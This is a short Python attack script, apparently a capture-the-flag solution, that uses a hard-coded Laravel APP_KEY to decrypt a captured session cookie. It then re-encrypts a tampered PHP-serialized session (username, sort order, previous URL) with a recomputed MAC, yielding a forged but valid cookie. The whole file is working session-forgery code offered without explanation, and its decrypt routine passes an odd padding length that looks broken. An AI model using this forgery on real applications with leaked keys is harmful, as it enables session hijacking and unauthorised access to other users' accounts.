import hmac
from Crypto.Cipher import AES
import base64
import json
import urllib.parse
from Crypto.Util.Padding import pad, unpad
from phpserialize import unserialize


class Laravel:
    def __init__(cls, key, cookie):
        cls.key = base64.b64decode(key)
        cls.cookie = json.loads(base64.b64decode(
            urllib.parse.unquote_plus(cookie)))

    def decrypt_value(cls: str) -> str:
        decoded_text = cls.cookie
        iv = base64.b64decode(decoded_text['iv'])

        crypt_object = AES.new(key=cls.key, mode=AES.MODE_CBC, IV=iv)

        decoded = base64.b64decode(decoded_text['value'])
        decrypted = unpad(crypt_object.decrypt(decoded), len(decoded)).decode()
        decoded_text['value'] = decrypted
        return decoded_text

    def encrypt_value(cls: str, toappend: str) -> dict:
        decoded_text = cls.cookie
        iv = base64.b64decode(decoded_text['iv'])

        crypt_object = AES.new(key=cls.key, mode=AES.MODE_CBC, IV=iv)

        encoded = toappend
        encrypted = crypt_object.encrypt(pad(encoded.encode(), AES.block_size))
        decoded_text['value'] = base64.b64encode(encrypted).decode()
        decoded_text['mac'] = hmac.new(cls.key, encrypted, digestmod='sha256').hexdigest()
        return decoded_text


def decode_laravel_format(val: str) -> str:
    val = str(val).replace('/', '\/').replace("'", '"').replace(" ", "")
    val = base64.b64encode(val.encode()).decode()
    return val


KEY = "GHXw+QM97EG1vWUzQI59o2IHYhE9XkYzYYBKMtx52+U="
COOKIE = "eyJpdiI6IlwvcW4zeGtlbncxanZlZkhkemo5K0hnPT0iLCJ2YWx1ZSI6IkhaSTcrXC82c2VDbEVsNFI1NjhcLzBuODVjMEVzS0hraFZhSWJ0QUFLNTVlNDZIdEowdHhjWE9RNXBWU3YwcmZVZlVva3pQNHpRZ1wvWWxPTkR6dUo4ZDF5MDZTUzh4NU1Dbk5mN0hOR1VBbkVqMWo2NStMRlR2S0Y0eEJtMzhDSE9xXC9HMnNyMTBIcytcL0hxXC9oTElKYXpRTHdcL0JERWJ1cm9OUWdERTN5OVRqd05MVEZMY3k5VTBzek5EVEJLSTVocEc5Ujc4NFZaa1JFZm8zRW81dWZ1UTg0T1h1UVRrdTJJRnFpNlQrVFdNbnVkbGlUXC84WUxlWjc3aDNDZnBQR2swUm9yU1o5eldaeERCWjdrcnBNckVTMGZVSWNXcnN5RVhIU3VMbjBYdlQ3YW9KeDZtbG1TaVhMdWlVN3E4M0g3c0Z5WlBvQVFJdWlGd0FCOFJLZXUxXC9FcnNjOXpOeG81QmxweXNkR1BHcHBHdklvODBaRXJyT2ZQTWlIYVZxYytRTCs2N2tXTlpHWEg5RXo3Zk8rN1pyZVJQZ0I5aURzUUhXV3pQc1RTbXFwWWVTdjJPNFFqZklDM3A0NTRlSlJNcGwxc3pDb0RkVU5YZWxCeEVCZ0Vqa1N3PT0iLCJtYWMiOiIwNWI1OGFiOGM2MzE3M2E0OTkzMzUwODk5MDkxNDQxNzJjMDI4MTQyOTA2ZTdjMTkwMGY0YzU2Y2RhNjE5MDQ1In0%3D"

lar = Laravel(KEY, COOKIE)
val = '''{"data":"a:6:{s:6:\\"_token\\";s:40:\\"qj28z6xeMzz0YCFKHZTTiiL5XQay9C0TzgffFUCX\\";s:8:\\"username\\";s:8:\\"guest691\\";s:5:\\"order\\";s:2:\\"id\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:38:\\"http:\\/\\/68.183.36.105:30227\\/api\\/configs\\";}}","expires":1658389344}'''
val = lar.encrypt_value(val)
print(val)
# print(decode_laravel_format(val))

lar = Laravel(KEY, COOKIE)
print(lar.decrypt_value())
